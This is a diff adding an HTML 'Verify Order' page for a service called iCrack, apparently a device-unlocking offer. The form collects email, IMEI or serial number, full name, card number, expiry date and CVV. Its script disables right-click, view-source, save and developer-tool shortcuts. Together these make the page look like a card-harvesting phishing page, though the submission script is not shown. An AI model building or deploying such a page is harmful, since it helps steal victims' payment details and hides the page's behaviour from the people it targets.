@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCrack - Verify Order</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/verify.css">
+	<!-- Favicon  -->
+    <link rel="icon" href="images/favicon.ico">
+</head>
+
+<script language="JavaScript">
+  window.onload = function() {
+    document.addEventListener("contextmenu", function(e){
+      e.preventDefault();
+    }, false);
+    document.addEventListener("keydown", function(e) {
+    //document.onkeydown = function(e) {
+      // "I" key
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
+        disabledEvent(e);
+      }
+      // "J" key
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+        disabledEvent(e);
+      }
+      // "S" key + macOS
+      if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
+        disabledEvent(e);
+      }
+      // "U" key
+      if (e.ctrlKey && e.keyCode == 85) {
+        disabledEvent(e);
+      }
+      // "F12" key
+      if (event.keyCode == 123) {
+        disabledEvent(e);
+      }
+    }, false);
+    function disabledEvent(e){
+      if (e.stopPropagation){
+        e.stopPropagation();
+      } else if (window.event){
+        window.event.cancelBubble = true;
+      }
+      e.preventDefault();
+      return false;
+    }
+  };
+</script>
+
+<body>
+    <div class="wrapper">
+        <h2 class="main-heading">Verify Order</h2>
+        <div class="form-wrapper">
+            <form id="form">
+                <div class="input-field">
+                    <label>Email Address</label>
+                    <input id="inputEmailID" type="text" placeholder="Email Address">
+                </div>
+                <div class="input-field">
+                    <label>IMEI OR SN</label>
+                    <input id="inputSN" type="text" placeholder="Write Here IMEI or SN">
+                </div>
+				<div class="input-field">
+                    <label>Full Name</label>
+                    <input id="inputName" type="text" placeholder="Full Name">
+                </div>
+				<div class="input-field">
+                    <label>Card Number</label>
+                    <input id="inputCardNumber" type="text" data-mask="0000-0000-0000-0000" placeholder="XXXX-XXXX-XXXX-XXXX">
+                </div>
+				<div class="input-field">
+                    <label>Expiry Date</label>
+                    <input id="inputExpiry" type="text" data-mask="00 / 00" placeholder="MM / YY">
+                </div>
+				<div class="input-field">
+                    <label>CVV / CVC</label>
+                    <input id="inputCVV" type="text" data-mask="000" placeholder="CVV / CVC">
+                </div>
+                <button class="main-button" type="submit">Verify</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="js/verify.js"></script>
+</body>
+</html>
